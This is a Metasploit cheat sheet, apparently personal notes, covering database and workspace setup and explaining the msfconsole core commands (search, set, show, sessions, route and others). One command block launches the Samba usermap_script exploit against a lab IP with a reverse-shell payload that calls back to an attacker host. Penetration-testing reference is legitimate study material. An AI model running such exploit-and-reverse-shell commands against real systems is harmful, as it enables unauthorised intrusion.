# Metasploit

## init database

```bash
msfdb init
```

## create new workspace

```bash
workspace -a [name]
```

## switch to workspace

```bash
workspace [name]
```

## run commands without interactive shell

```bash
msfconsole -x "use exploit/multi/samba/usermap_script;\
set RHOST 172.16.194.172;\
set PAYLOAD cmd/unix/reverse;\
set LHOST 172.16.194.163;\
run"
```

## MSFconsole Core Commands

### back

Once you have finished working with a particular module, or if you inadvertently select the wrong module, you can issue the back command to move out of the current context. This, however is not required. Just as you can in commercial routers, you can switch modules from within other modules. As a reminder, variables will only carry over if they are set globally.

### check

There aren’t many exploits that support it, but there is also a check option that will check to see if a target is vulnerable to a particular exploit instead of actually exploiting it.

### connect

There is a miniature Netcat clone built into the msfconsole that supports SSL, proxies, pivoting, and file transfers. By issuing the connect command with an IP address and port number, you can connect to a remote host from within msfconsole the same as you would with Netcat or Telnet. You can see all the additional options by issuing the -h parameter.

### edit

The edit command will edit the current module with $VISUAL or $EDITOR. By default, this will open the current module in Vim.

### exit

The exit command will simply exit msfconsole.

### grep

The grep command is similar to Linux grep. It matches a given pattern from the output of another msfconsole command. The following is an example of using grep to match output containing the string "http" from a search for modules containing the string "oracle".

### help

The help command will give you a list and small description of all available commands.

### info

The info command will provide detailed information about a particular module including all options, targets, and other information. Be sure to always read the module description prior to using it as some may have un-desired effects.

The info command also provides the following information:

- The author and licensing information
- Vulnerability references (ie: CVE, BID, etc)
- Any payload restrictions the module may have

### irb

Running the irb command will drop you into a live Ruby interpreter shell where you can issue commands and create Metasploit scripts on the fly. This feature is also very useful for understanding the internals of the Framework.

### jobs

Jobs are modules that are running in the background. The jobs command provides the ability to list and terminate these jobs.

### kill

The kill command will kill any running jobs when supplied with the job id.

### load

The load command loads a plugin from Metasploit’s plugin directory. Arguments are passed as key=val on the shell.

#### loadpath

The loadpath command will load a third-part module tree for the path so you can point Metasploit at your 0-day exploits, encoders, payloads, etc.

#### unload

Conversely, the unload command unloads a previously loaded plugin and removes any extended commands.

### resource

The resource command runs resource (batch) files that can be loaded through msfconsole.

Some attacks, such as Karmetasploit, use resource files to run a set of commands in a karma.rc file to create an attack. Later, we will discuss how, outside of Karmetasploit, that can be very useful.

Batch files can greatly speed up testing and development times as well as allow the user to automate many tasks. Besides loading a batch file from within msfconsole, they can also be passed at startup using the -r flag. The simple example below creates a batch file to display the Metasploit version number at startup.

### route

The route command in Metasploit allows you to route sockets through a session or  'comm', providing basic pivoting capabilities. To add a route, you pass the target subnet and network mask followed by the session (comm) number.

### search

The msfconsole includes an extensive regular-expression based search functionality. If you have a general idea of what you are looking for, you can search for it via search. In the output below, a search is being made for MS Bulletin MS09-011. The search function will locate this string within the module names, descriptions, references, etc.

Note the naming convention for Metasploit modules uses underscores versus hyphens.

#### help

You can further refine your searches by using the built-in keyword system.

#### name

To search using a descriptive name, use the name keyword.

#### platform

You can use platform to narrow down your search to modules that affect a specific platform.

#### type

Using the type lets you filter by module type such as auxiliary, post, exploit, etc.

#### author

Searching with the author keyword lets you search for modules by your favourite author.

#### multiple

You can also combine multiple keywords together to further narrow down the returned results.

### sessions

The sessions command allows you to list, interact with, and kill spawned sessions. The sessions can be shells, Meterpreter sessions, VNC, etc.

### set

The set command allows you to configure Framework options and parameters for the current module you are working with.

Metasploit also allows you to set an encoder to use at run-time. This is particularly useful in exploit development when you aren’t quite certain as to which payload encoding methods will work with a given exploit.

### unset

The opposite of the set command, of course, is unset. unset removes a parameter previously configured with set. You can remove all assigned variables with unset all.

### setg

n order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set, you can use them in as many exploits and auxiliary modules as you like. You can also save them for use the next time you start msfconsole. However, the pitfall is forgetting you have saved globals, so always check your options before you run or exploit. Conversely, you can use the unsetg command to unset a global variable. In the examples that follow, variables are entered in all-caps (ie: LHOST), but Metasploit is case-insensitive so it is not necessary to do so.

After setting your different variables, you can run the save command to save your current environment and settings. With your settings saved, they will be automatically loaded on startup, which saves you from having to set everything again.


### show

Entering show at the msfconsole prompt will display every module within Metasploit.

There are a number of show commands you can use but the ones you will use most frequently are show auxiliary, show exploits, show payloads, show encoders, and show nops.

#### auxiliary

Executing show auxiliary will display a listing of all of the available auxiliary modules within Metasploit. As mentioned earlier, auxiliary modules include scanners, denial of service modules, fuzzers, and more.

#### exploits 

Naturally, show exploits will be the command you are most interested in running since at its core, Metasploit is all about exploitation. Run show exploits to get a listing of all exploits contained in the framework.

#### Using MSFconsole Payloads

Running show payloads will display all of the different payloads for all platforms available within Metasploit.

#### payloads

As you can see, there are a lot of payloads available. Fortunately, when you are in the context of a particular exploit, running show payloads will only display the payloads that are compatible with that particular exploit. For instance, if it is a Windows exploit, you will not be shown the Linux payloads.

#### options

If you have selected a specific module, you can issue the show options command to display which settings are available and/or required for that specific module.

#### targets

If you aren’t certain whether an operating system is vulnerable to a particular exploit, run the show targets command from within the context of an exploit module to see which targets are supported.

#### advanced

If you wish the further fine-tune an exploit, you can see more advanced options by running show advanced.

#### encoders

Running show encoders will display a listing of the encoders that are available within MSF.

#### nops

Lastly, issuing the show nops command will display the NOP Generators that Metasploit has to offer.

### use

When you have decided on a particular module to make use of, issue the use command to select it. The use command changes your context to a specific module, exposing type-specific commands. Notice in the output below that any global variables that were previously set are already configured.
